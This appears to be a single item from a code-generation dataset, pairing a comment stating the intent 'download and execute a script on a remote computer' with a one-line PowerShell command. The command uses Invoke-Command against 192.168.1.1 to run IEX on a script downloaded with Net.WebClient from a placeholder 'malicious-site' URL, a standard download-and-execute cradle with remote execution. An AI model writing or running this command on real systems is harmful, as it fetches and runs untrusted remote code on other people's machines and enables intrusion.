# Natural language intent:
# Download and execute a script on a remote computer using Invoke-Command and Invoke-Expression.

Invoke-Command -ComputerName 192.168.1.1 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious-site')}
